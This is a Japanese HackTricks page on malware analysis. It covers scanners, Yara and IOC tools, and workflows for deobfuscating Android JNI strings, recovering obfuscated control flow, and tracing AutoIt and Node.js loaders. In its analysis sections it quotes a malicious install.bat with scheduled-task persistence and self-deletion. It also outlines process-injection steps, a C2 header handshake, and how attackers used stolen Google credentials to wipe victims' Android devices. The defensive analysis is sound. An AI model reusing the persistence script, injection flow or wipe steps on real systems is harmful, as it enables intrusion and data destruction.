# マルウェア解析

{{#include ../../banners/hacktricks-training.md}}

## フォレンジック チートシート

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## オンラインサービス

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## オフラインのアンチウイルスおよび検出ツール

### Yara

#### インストール
```bash
sudo apt-get install -y yara
```
#### ルールの準備

このスクリプトを使って、githubからすべてのyara malware rulesをダウンロードしてマージしてください: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\
Create the _**rules**_ directory and execute it. This will create a file called _**malware_rules.yar**_ which contains all the yara rules for malware.
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### スキャン
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: malwareをチェックしてルールを作成する

このツール [**YaraGen**](https://github.com/Neo23x0/yarGen) を使って、バイナリから yara rules を生成できます。以下のチュートリアルを参照してください: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### インストール
```
sudo apt-get install -y clamav
```
#### スキャン
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa** は実行ファイル（PE、ELF、.NET）内の潜在的に悪意のある機能を検出します。したがって、Att\&ck tactics のようなものや、次のような疑わしい機能を検出します:

- OutputDebugString のエラーをチェックする
- サービスとして実行する
- プロセスを作成する

入手先は[**Github repo**](https://github.com/mandiant/capa)。

### IOCs

IOC は Indicator Of Compromise の略です。IOC は、潜在的に望ましくないソフトウェアや確定したマルウェアを識別するための条件の集合です。Blue Teams はこのような定義を使って、システムやネットワーク内でこの種の悪意のあるファイルを検索します。\
これらの定義を共有することは非常に有用です。なぜなら、あるコンピュータでマルウェアが特定され、そのマルウェア用の IOC が作成されれば、他の Blue Teams がそれを使ってマルウェアをより速く特定できるからです。

IOC を作成・修正するツールの一つが [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**.**\
定義された IOC をデバイス内で検索するには [**Redline**](https://www.fireeye.com/services/freeware/redline.html) などのツールを使用できます。

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) は Simple Indicators of Compromise 向けのスキャナーです。\
検出は4つの検出方法に基づきます:
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) は、GNU GPLv2 ライセンスで公開された Linux 向けの malware スキャナで、共有ホスティング環境で直面する脅威に対応するよう設計されています。ネットワークエッジの侵入検知システムからの脅威データを使用し、攻撃に実際に使われている malware を抽出して検出用のシグネチャを生成します。さらに、脅威データは LMD checkout feature を使ったユーザー提出や malware コミュニティのリソースからも得られます。

### rkhunter

Tools like [**rkhunter**](http://rkhunter.sourceforge.net) can be used to check the filesystem for possible **rootkits** and malware.
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) は、様々な手法を用いて実行ファイル内の obfuscated strings を探すツールです。

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper) は実行ファイル内の基本的な項目をチェックします（binary data, entropy, URLs and IPs, some yara rules）。

### PEstudio

[PEstudio](https://www.winitor.com/download) は imports, exports, headers といった Windows 実行ファイルの情報を取得できるツールで、virus total をチェックしたり潜在的な Att\&ck techniques を見つけたりします。

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) はファイルが **encrypted** かどうかを検出し、**packers** も見つけるツールです。

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI) は Python スクリプトで、様々な **統計的手法** を用いてテキスト/スクリプトファイル内の **obfuscated** および **encrypted** コンテンツを検出します。NeoPI の目的は、隠れた **web shell** コードの **検出** を支援することです。

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) は **obfuscated**/**dodgy code** の検出に特化しており、**PHP** 関数を多用する **malwares**/webshells を含むファイルも検出します。

### Apple Binary Signatures

ある **malware sample** を確認する際は、署名した **developer** がすでに **malware** と **related** している可能性があるため、バイナリの **check the signature** を必ず行ってください。
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## 検出手法

### File Stacking

あるフォルダに Web サーバの **files** があり、そのフォルダが **最後に更新された日付** が分かっている場合、Web サーバ内のすべての **files** の作成日と更新日を**確認**し、疑わしい日付のファイルがあればそのファイルを調べます。

### Baselines

フォルダ内のファイルが本来 **変更されるべきでない** 場合は、フォルダ内の**元のファイル**のハッシュを計算して**現在の**ものと**比較**できます。変更されているものはすべて**疑わしい**と判断します。

### Statistical Analysis

情報がログに保存されている場合、各 Web サーバのファイルが何回アクセスされたかといった統計を**確認**できます。web shell は最も多くアクセスされるファイルの一つである可能性があります。

---

### Android in-app native telemetry (no root)

Android では、ターゲットアプリのプロセス内でネイティブコードを可観測にするために、他の JNI libs が初期化される前に小さなロガーライブラリをプリロードする手法があります。これにより、システム全体のフックや root 権限なしでネイティブ挙動を早期に可視化できます。一般的なアプローチは SoTap：対応 ABI の libsotap.so を APK に配置し、早期（例：static initializer や Application.onCreate）に System.loadLibrary("sotap") を注入して、内部/外部のパスや Logcat をフォールバックとしてログを収集します。

セットアップ詳細とログパスは Android native reversing ページを参照してください：

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

一部の Android マルウェアや RASP 保護されたアプリは、RegisterNatives を呼ぶ前に実行時に JNI メソッド名やシグネチャをデコードして隠します。Frida/ptrace によるインストルメンテーションが anti-debug によって殺される場合でも、angr を使ってバイナリ内のデコーダを実行し、平文をオフラインで復元してから結果を Ghidra にコメントとして戻すことが可能です。

キーアイデア：.so 内のデコーダを呼び出し可能な関数として扱い、.rodata にある難読化されたバイトブロブに対してそれを実行し、出力バイトを最初の \x00 (C-string terminator) まで具体化します。アドレス不一致を避けるため、angr と Ghidra で同じ image base を使い続けてください。

ワークフロー概要
- Ghidra でのトリアージ：decoder とその呼び出し規約/引数を JNI_OnLoad と RegisterNatives のセットアップから特定する。
- angr (CPython3) を実行して各ターゲット文字列に対してデコーダを実行し、結果をダンプする。
- Ghidra に注釈付け：各呼び出し箇所にデコードされた文字列を自動コメントとして付与し、JNI 再構築を高速化する。

Ghidra triage (JNI_OnLoad pattern)
- JNI_OnLoad に JNI データ型を適用して、Ghidra が JNINativeMethod 構造を認識するようにする。
- Oracle ドキュメントにある典型的な JNINativeMethod:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- RegisterNatives への呼び出しを探します。ライブラリが名前/シグネチャをローカルルーチン（例：FUN_00100e10）で構築しており、そのルーチンが static byte table（例：DAT_00100bf4）を参照し、(encoded_ptr, out_buf, length) のようなパラメータを取る場合、オフライン実行の理想的ターゲットです。

angr setup (execute the decoder offline)
- Ghidra で使ったのと同じ base（例：0x00100000）で .so をロードし、外部ライブラリの自動ロードを無効にして状態を小さく保ちます。

<details>
<summary>angr setup and offline decoder execution</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- 大規模に行う場合、call sites と decoder の引数 (encoded_ptr, size) の静的マップを構築する。Wrappers が引数を隠していることがあるため、API 復元がノイズが多い場合は Ghidra xrefs からこのマッピングを手動で作成することがある。

<details>
<summary>angr で複数の call sites をバッチデコード</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Ghidraでコールサイトに注釈を付ける
オプションA: Jython-only comment writer (use a pre-computed JSON)
- angrがCPython3を必要とするため、難読化解除と注釈付けは分けて行ってください。まず上記のangrスクリプトを実行してdecoded_strings.jsonを生成します。続いてこのJython GhidraScriptを実行して、各コールサイトにPRE_COMMENTsを書き込みます（呼び出し元関数名を含めてコンテキストを付与します）:

<details>
<summary>Ghidra Jython script to annotate decoded JNI strings</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Option B: Single CPython script via pyhidra/ghidra_bridge
- Alternatively, use pyhidra or ghidra_bridge to drive Ghidra’s API from the same CPython process running angr. This allows calling decode_string() and immediately setting PRE_COMMENTs without an intermediate file. The logic mirrors the Jython script: build callsite→function map via ReferenceManager, decode with angr, and set comments.

Why this works and when to use it
- Offline execution sidesteps RASP/anti-debug: no ptrace, no Frida hooks required to recover strings.
- Keeping Ghidra and angr base_addr aligned (e.g., 0x00100000) ensures that function/data addresses match across tools.
- Repeatable recipe for decoders: treat the transform as a pure function, allocate an output buffer in a fresh state, call it with (encoded_ptr, out_ptr, len), then concretize via state.solver.eval and parse C-strings up to \x00.

Notes and pitfalls
- Respect the target ABI/calling convention. angr.factory.callable picks one based on arch; if arguments look shifted, specify cc explicitly.
- If the decoder expects zeroed output buffers, initialize outbuf with zeros in the state before the call.
- For position-independent Android .so, always supply base_addr so addresses in angr match those seen in Ghidra.
- Use currentProgram.getReferenceManager() to enumerate call-xrefs even if the app wraps the decoder behind thin stubs.

For angr basics, see: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## 動的制御フローの復号 (JMP/CALL RAX Dispatchers)

Modern malware families heavily abuse Control-Flow Graph (CFG) obfuscation: instead of a direct jump/call they compute the destination at run-time and execute a `jmp rax` or `call rax`.  A small *dispatcher* (typically nine instructions) sets the final target depending on the CPU `ZF`/`CF` flags, completely breaking static CFG recovery.

The technique – showcased by the SLOW#TEMPEST loader – can be defeated with a three-step workflow that only relies on IDAPython and the Unicorn CPU emulator.

### 1. Locate every indirect jump / call
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. dispatcher byte-code を抽出する
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Unicornでそれを2回エミュレートする
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
`run(code,0,0)` と `run(code,1,1)` を実行して、*false* および *true* ブランチのターゲットを取得します。

### 4. パッチで直接的な jump / call を元に戻す
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
パッチ適用後、関数を再解析するようにIDAに強制して、完全なCFGとHex-Raysの出力を復元します:
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. 間接的な API 呼び出しにラベルを付ける

実際の宛先がすべての `call rax` について判明したら、IDA にそれが何かを教えることでパラメータの型や変数名を自動的に復元させることができます:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### 実用的な利点

* 実際の CFG を復元 → decompilation が *10* 行から数千行になる。
* string-cross-reference & xrefs を有効にし、behaviour reconstruction を容易にする。
* Scripts は再利用可能: 同じトリックで保護された任意の loader にそのまま投入できる。

---

## AutoIt-based loaders: .a3x decryption, Task Scheduler masquerade and RAT injection

この侵入パターンは、署名付き MSI、.a3x にコンパイルされた AutoIt loaders、および良性のアプリを装う Task Scheduler ジョブを連鎖させます。

### MSI → custom actions → AutoIt orchestrator

MSI の custom actions によって実行されるプロセスツリーとコマンド:

- MsiExec.exe → cmd.exe が install.bat を実行
- WScript.exe がデコイのエラーダイアログを表示
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (loader を配置し、persistence を設定し、自己消去する):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (ユーザーデコイ):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Key artifacts and masquerade:
- AutoIt3.exe と IoKlTr.au3 を `C:\Users\Public\Music` にドロップする
- `schtasks.exe` を `hwpviewer.exe` としてコピー（Hangul Word Processor viewer を偽装）
- 毎分実行されるスケジュールタスク "IoKlTr" を作成
- スタートアップ LNK は `Smart_Web.lnk` として確認される；mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- モジュールを `%APPDATA%\Google\Browser\` 以下の `adb` または `adv` を含むサブフォルダに展開し、`autoit.vbs`/`install.bat` ヘルパー経由で起動する

Forensic triage tips:
- schtasks の列挙: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Task XML と同じ場所にある名前変更された `schtasks.exe` のコピーを探す: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- 一般的なパス: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, スタートアップ `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- プロセス作成の相関: AutoIt3.exe が正当な Windows バイナリ（例: `cleanmgr.exe`, `hncfinder.exe`）を生成しているか確認する

### AutoIt ローダーと .a3x ペイロードの復号 → インジェクション

- AutoIt モジュールは `#AutoIt3Wrapper_Outfile_type=a3x` でコンパイルされ、埋め込まれたペイロードを復号してから正当プロセスにインジェクトする
- 観測されたファミリー: QuasarRAT（`hncfinder.exe` にインジェクト）、RftRAT/RFTServer（`cleanmgr.exe` にインジェクト）、および RemcosRAT モジュール（`Remcos\RunBinary.a3x`）など
- 復号パターン: HMAC によって AES キーを導出し、埋め込まれたブロブを復号した後、平文のモジュールをインジェクトする

Generic decryption skeleton (exact HMAC input/algorithm is family-specific):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Common injection flow (CreateRemoteThread-style):
- ターゲットホストの CreateProcess (suspended)（例: cleanmgr.exe）
- VirtualAllocEx + WriteProcessMemory で復号済みモジュール/シェルコードを書き込む
- CreateRemoteThread または QueueUserAPC でペイロードを実行

Hunting ideas
- AutoIt3.exe が MsiExec.exe または WScript.exe に親付けされ、システムユーティリティを起動している
- `.a3x` 拡張子のファイル、または public/ユーザー書き込み可能なパスにある AutoIt スクリプトランナー
- AutoIt3.exe を実行する、または Microsoft によって署名されていないバイナリを実行する、分単位トリガーの疑わしいスケジュールドタスク

### Account-takeover abuse of Android Find My Device (Find Hub)

Windows 侵害中、オペレータは盗まれた Google 資格情報を使って被害者の Android デバイスを繰り返し消去し、通知を抑制しながら被害者のログイン済みデスクトップメッセンジャー経由でアクセスを拡大しました。

Operator steps (from a logged-in browser session):
- Google Account → Security → Your devices を確認；Find My Phone → Find Hub (https://www.google.com/android/find)
- デバイスを選択 → Google パスワードを再入力 → "Erase device"（工場出荷時リセット）を実行；回復を遅らせるために繰り返す
- 任意: セキュリティ通知を隠すために、リンクされたメールボックス（例: Naver）内のアラートメールを削除

## Tracing heavily obfuscated Node.js loaders

攻撃者は増加して、[`nexe`](https://github.com/nexe/nexe) でコンパイルしたスタンドアロンの Windows バイナリ内に JavaScript ローダーをバンドルしており、ランタイムがスクリプトと一緒に配布されます。生成される PE はしばしば 60–90 MB 程度になり、Node.js がインストールされていなくても実行されます。トリアージ中は次を行います:

- [`nexe_unpacker`](https://npm.io/package/nexe_unpacker) を使って PE から埋め込まれた JavaScript を切り出し、ローカルのツールに渡して静的 diff を行う。
- `%TEMP%` にディスクベースのミューテックスがあることを想定する（GachiLoader はランダムな `<name>.lock` ファイルをドロップし、約 5 分で期限切れになる）。実行前にそのファイルをサンドボックスにコピーしておくと、後続のペイロードを確認しつつ冗長な段階をスキップできる。

### Node.js API tracing to defeat anti-analysis

Check Point’s [Nodejs-Tracer](https://github.com/CheckPointSW/Nodejs-Tracer) は任意の Node.js プロセス内のコアモジュールにフックし、anti-VM プローブを偽装でき、サンプルが書き込むすべてのアーティファクトを保持します。難読化されたスクリプトを tracer 経由で起動すると、アナリスト制御下のインストルメンテーションがコールスタックに残ります:
```powershell
node -r .\tracer.js main.js
```
Key configuration toggles inside `tracer.js` allow you to:

- ファイルシステム、子プロセス、HTTP の活動をログする（`LOG_HTTP_REQUESTS`、`SAVE_FILE_WRITES`）。`kidkadi.node` のようなドロップされたファイルは、マルウェアが削除する前に作業ディレクトリへコピーされます。
- RAM/CPU カウントを現実的に偽装したり、`tasklist` の出力を偽造したり、PowerShell/WMI の応答を書き換えて環境フィンガープリントを上書きします。これにより ≥4 GB RAM、≥2 コアを要求し、ユーザー名（`mashinesssss`、`wdagutilityaccount` 等）、ホスト名（`desktop-vrsqlag`、`server1` …）、プロセス名（`vmtoolsd.exe`、`fiddler.exe`、`x64dbg.exe`、`frida-server.exe`）を精査するローダーを回避できます。
- `Get-WmiObject Win32_DiskDrive`（`vmware`、`kvm`、`virtio` などを探す）、`Win32_VideoController`（“VirtualBox Graphics Adapter”、“Hyper-V Video” 等をブロック）や `Win32_PortConnector` の数といった WMI ハードウェアチェックを無効化します。これらのプローブが“実機”を返すと、サンドボックスは GachiLoader が解析時間を浪費させるために行う `Invoke-WebRequest` を使った linkedin.com、grok.com、whatsapp.com 等への無限ループの無害な呼び出しにハマらなくなります。

### Capturing gated C2 traffic automatically

tracer のネットワークフックは、JavaScript の難読化を逆解析せずに多層の C2 認証を明らかにします。観測されたキャンペーンではローダーは次のように動作しました：

1. 各ハードコーディングされた C2 の `/log` にホストのテレメトリを POST する。
2. `X-Secret: gachifamily` を付けて `GET /richfamily/<per-sample key>` を発行し、Base64 エンコードされたペイロード URL を取得する。
3. 最後にその URL へ長い per-sample な `X-Secret` ヘッダを付けて `GET` を実行する。ヘッダが欠けていると `403 Forbidden` が返る。

tracer がリクエスト（ヘッダ、ボディ、宛先）を完全に記録するため、同じトラフィックを再生してペイロードを取得したり、メモリ上の Themida/VMProtect シェルをダンプしたり、Rhadamanthys の設定データをスケールで抽出したりできます。

## AdaptixC2: Configuration Extraction and TTPs

専用ページを参照：

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## References

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Nodejs-Tracer – GitHub](https://github.com/CheckPointSW/Nodejs-Tracer)

{{#include ../../banners/hacktricks-training.md}}
